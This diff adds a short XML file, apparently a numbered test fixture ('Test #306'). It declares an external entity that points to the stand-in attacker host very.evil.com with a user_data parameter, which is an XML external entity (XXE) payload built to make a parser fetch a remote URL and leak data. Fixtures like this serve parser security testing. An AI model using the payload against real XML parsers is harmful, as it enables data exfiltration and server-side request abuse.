@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+   <!ENTITY external_info SYSTEM "http://very.evil.com/user_data=123">
+]>
+<foo>
+   Test #306.
+   &external_info;
+</foo>
